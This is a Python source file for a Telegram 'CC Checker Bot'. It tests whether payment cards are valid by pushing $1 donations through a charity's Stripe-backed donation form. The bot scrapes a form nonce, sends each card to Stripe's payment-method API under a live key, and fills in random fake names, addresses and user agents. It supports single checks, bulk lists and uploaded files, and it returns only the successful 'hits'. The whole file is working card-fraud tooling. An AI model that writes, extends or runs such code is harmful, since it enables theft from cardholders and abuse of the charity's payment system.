import asyncio
import json
import random
import re
import os
import aiohttp
from fake_useragent import UserAgent
from telegram import Update, Document
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import io
from config import BOT_TOKEN, MAX_CARDS_PER_MASS_CHECK, DELAY_BETWEEN_CHECKS, ENVIRONMENT
import logging

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

async def get_random_info():
    first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Miller", "Davis", "Garcia", "Rodriguez", "Wilson"]
    return {
        "fname": random.choice(first_names),
        "lname": random.choice(last_names),
        "email": f"{random.choice(first_names).lower()}.{random.choice(last_names).lower()}{random.randint(100,999)}@example.com",
        "phone": f"{random.randint(200,999)}-{random.randint(200,999)}-{random.randint(1000,9999)}",
        "add1": f"{random.randint(1,999)} {random.choice(['Main', 'Oak', 'Pine', 'Maple', 'Cedar'])} St",
        "city": random.choice(["New York", "Los Angeles", "Chicago", "Houston", "Phoenix"]),
        "state": random.choice(["California", "Texas", "Florida", "New York", "Pennsylvania"]),
        "state_short": random.choice(["CA", "TX", "FL", "NY", "PA"]),
        "zip": f"{random.randint(10000,99999)}"
    }

async def check_cc(fullz, session):
    try:
        cc, mes, ano, cvv = fullz.split("|")
        if len(ano) == 2:
            ano = "20" + ano
        random_data = await get_random_info()
        email = random_data["email"]
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'user-agent': UserAgent().random,
        }
        response = await session.get('https://needhelped.com/campaigns/poor-children-donation-4/donate/', headers=headers)
        text = await response.text()
        nonce = gets(text, '<input type="hidden" name="_charitable_donation_nonce" value="', '"  />')
        if not nonce:
            return f"{fullz} | Error: Could not get nonce"
        payment_headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': UserAgent().random,
        }
        payment_data = {
            'type': 'card',
            'billing_details[name]': f"{random_data['fname']} {random_data['lname']}",
            'billing_details[email]': email,
            'billing_details[address][city]': random_data['city'],
            'billing_details[address][country]': 'US',
            'billing_details[address][line1]': random_data['add1'],
            'billing_details[address][postal_code]': random_data['zip'],
            'billing_details[address][state]': random_data['state'],
            'billing_details[phone]': random_data['phone'],
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mes,
            'card[exp_year]': ano,
            'pasted_fields': 'number',
            'payment_user_agent': 'stripe.js/961a2db59d; stripe-js-v3/961a2db59d; card-element',
            'referrer': 'https://needhelped.com',
            'time_on_page': str(random.randint(100000, 999999)),
            'key': 'pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr',
        }
        payment_response = await session.post('https://api.stripe.com/v1/payment_methods', headers=payment_headers, data=payment_data)
        payment_json = await payment_response.json()
        try:
            payment_id = payment_json['id']
        except:
            return f"{fullz} | Error: Could not create payment method"
        donation_headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://needhelped.com',
            'referer': 'https://needhelped.com/campaigns/poor-children-donation-4/donate/',
            'user-agent': UserAgent().random,
            'x-requested-with': 'XMLHttpRequest',
        }
        donation_data = {
            'charitable_form_id': '68554709112d9',
            '68554709112d9': '',
            '_charitable_donation_nonce': nonce,
            '_wp_http_referer': '/campaigns/poor-children-donation-4/donate/',
            'campaign_id': '1164',
            'description': 'Poor Children Donation Support',
            'ID': '0',
            'donation_amount': 'custom',
            'custom_donation_amount': '1.00',
            'first_name': random_data['fname'],
            'last_name': random_data['lname'],
            'email': email,
            'address': random_data['add1'],
            'address_2': '',
            'city': random_data['city'],
            'state': random_data['state'],
            'postcode': random_data['zip'],
            'country': 'US',
            'phone': random_data['phone'],
            'gateway': 'stripe',
            'stripe_payment_method': payment_id,
            'action': 'make_donation',
            'form_action': 'make_donation',
        }
        donation_response = await session.post('https://needhelped.com/wp-admin/admin-ajax.php', headers=donation_headers, data=donation_data)
        response_text = await donation_response.text()
        if "Thank" in response_text:
            return f"{fullz} | ✅ Charged Successfully"
        else:
            try:
                error = json.loads(response_text)["errors"][0]
                return f"{fullz} | ❌ {error}"
            except:
                return f"{fullz} | ❌ Unknown Error"
    except Exception as e:
        return f"{fullz} | ❌ Error: {str(e)}"

def is_valid_cc_format(cc_string):
    return bool(re.match(r'\d{16}\|\d{2}\|(\d{4}|\d{2})\|\d{3,4}', cc_string.strip()))

def is_hit(result):
    return "✅ Charged Successfully" in result

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_message = """
🤖 **CC Checker Bot**

Available commands:
• `/chk <cc|mm|yyyy|cvv>` - Check single card
• `/mass <cards>` - Check multiple cards (unlimited)
• Send a .txt file - Check cards from file (only shows hits)

Format: `1234567890123456|12|2025|123`
💡 **No limits on number of cards!**
"""
    await update.message.reply_text(welcome_message, parse_mode='Markdown')

async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❌ Please provide a card in format: cc|mm|yyyy|cvv")
        return
    
    cc_input = " ".join(context.args)
    if not is_valid_cc_format(cc_input):
        await update.message.reply_text("❌ Invalid format. Use: cc|mm|yyyy|cvv")
        return
    
    status_msg = await update.message.reply_text("🔄 Checking card...")
    
    async with aiohttp.ClientSession() as session:
        result = await check_cc(cc_input, session)
        await status_msg.edit_text(f"**Result:**\n`{result}`", parse_mode='Markdown')

async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❌ Please provide cards separated by spaces or new lines\n\nExample:\n`/mass 1234567890123456|12|2025|123 4111111111111111|01|2026|456`\n\n💡 **No limit on number of cards!**", parse_mode='Markdown')
        return

    # Parse cards from the message - handle both space and newline separation
    cards_text = " ".join(context.args)
    # Split by both spaces and potential newlines
    cards = []
    for part in cards_text.split():
        if '|' in part and is_valid_cc_format(part):
            cards.append(part.strip())

    valid_cards = [card for card in cards if is_valid_cc_format(card)]

    if not valid_cards:
        await update.message.reply_text("❌ No valid cards found. Format: cc|mm|yyyy|cvv")
        return

    # Check if there's a limit set (0 means unlimited)
    if MAX_CARDS_PER_MASS_CHECK > 0 and len(valid_cards) > MAX_CARDS_PER_MASS_CHECK:
        await update.message.reply_text(f"❌ Too many cards. Maximum allowed: {MAX_CARDS_PER_MASS_CHECK}")
        return

    status_msg = await update.message.reply_text(f"🔄 Checking {len(valid_cards)} cards...")

    results = []
    hits = 0
    async with aiohttp.ClientSession() as session:
        for i, card in enumerate(valid_cards, 1):
            result = await check_cc(card, session)
            results.append(result)

            if is_hit(result):
                hits += 1

            # Add delay to avoid rate limiting
            if DELAY_BETWEEN_CHECKS > 0:
                await asyncio.sleep(DELAY_BETWEEN_CHECKS)

            # Update status every 5 cards
            if i % 5 == 0 or i == len(valid_cards):
                await status_msg.edit_text(f"🔄 Checking cards... {i}/{len(valid_cards)} | Hits: {hits}")

    # Send results
    results_text = "\n".join(results)
    if len(results_text) > 4000:  # Telegram message limit
        # Split into chunks
        chunks = [results_text[i:i+4000] for i in range(0, len(results_text), 4000)]
        await status_msg.edit_text(f"**Mass Check Results ({len(valid_cards)} cards, {hits} hits):**", parse_mode='Markdown')
        for chunk in chunks:
            await update.message.reply_text(f"`{chunk}`", parse_mode='Markdown')
    else:
        await status_msg.edit_text(f"**Mass Check Results ({hits} hits):**\n`{results_text}`", parse_mode='Markdown')

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document

    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a .txt file containing credit cards")
        return

    # Check file size (max 20MB)
    if document.file_size > 20 * 1024 * 1024:
        await update.message.reply_text("❌ File too large. Maximum size: 20MB")
        return

    status_msg = await update.message.reply_text("📥 Processing file...")

    try:
        # Download file
        file = await context.bot.get_file(document.file_id)
        file_content = await file.download_as_bytearray()

        # Parse cards from file
        content = file_content.decode('utf-8', errors='ignore')
        cards = [card.strip() for card in content.split('\n') if card.strip()]
        valid_cards = [card for card in cards if is_valid_cc_format(card)]

        if not valid_cards:
            await status_msg.edit_text("❌ No valid cards found in file. Format: cc|mm|yyyy|cvv")
            return

        await status_msg.edit_text(f"🔄 Found {len(valid_cards)} valid cards. Checking for hits...")

        hits = []
        checked = 0
        async with aiohttp.ClientSession() as session:
            for i, card in enumerate(valid_cards, 1):
                result = await check_cc(card, session)
                checked += 1

                if is_hit(result):
                    hits.append(result)

                # Add delay to avoid rate limiting
                if DELAY_BETWEEN_CHECKS > 0:
                    await asyncio.sleep(DELAY_BETWEEN_CHECKS)

                # Update status every 10 cards
                if i % 10 == 0 or i == len(valid_cards):
                    await status_msg.edit_text(f"🔄 Checking cards... {i}/{len(valid_cards)} | Hits: {len(hits)}")

        # Send only hits
        if hits:
            hits_text = "\n".join(hits)
            if len(hits_text) > 4000:
                chunks = [hits_text[i:i+4000] for i in range(0, len(hits_text), 4000)]
                await status_msg.edit_text(f"**📁 File Check Results - HITS ONLY**\n**{len(hits)} hits from {len(valid_cards)} cards:**", parse_mode='Markdown')
                for chunk in chunks:
                    await update.message.reply_text(f"`{chunk}`", parse_mode='Markdown')
            else:
                await status_msg.edit_text(f"**📁 File Check Results - HITS ONLY:**\n`{hits_text}`", parse_mode='Markdown')
        else:
            await status_msg.edit_text(f"❌ No hits found from {len(valid_cards)} cards")

    except Exception as e:
        await status_msg.edit_text(f"❌ Error processing file: {str(e)}")

def main():
    # Configure logging for Render.com
    logging.basicConfig(
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        level=logging.INFO
    )
    logger = logging.getLogger(__name__)

    # Validate bot token
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        logger.error("❌ Bot token not configured! Set BOT_TOKEN environment variable.")
        return

    logger.info(f"🤖 Starting Telegram CC Checker Bot...")
    logger.info(f"Environment: {ENVIRONMENT}")

    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("chk", chk_command))
    application.add_handler(CommandHandler("mass", mass_command))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    logger.info("✅ Bot handlers registered successfully")
    logger.info("🚀 Starting polling...")

    try:
        application.run_polling(
            drop_pending_updates=True,
            allowed_updates=["message", "callback_query"]
        )
    except Exception as e:
        logger.error(f"❌ Bot crashed: {e}")
        raise

if __name__ == "__main__":
    main()
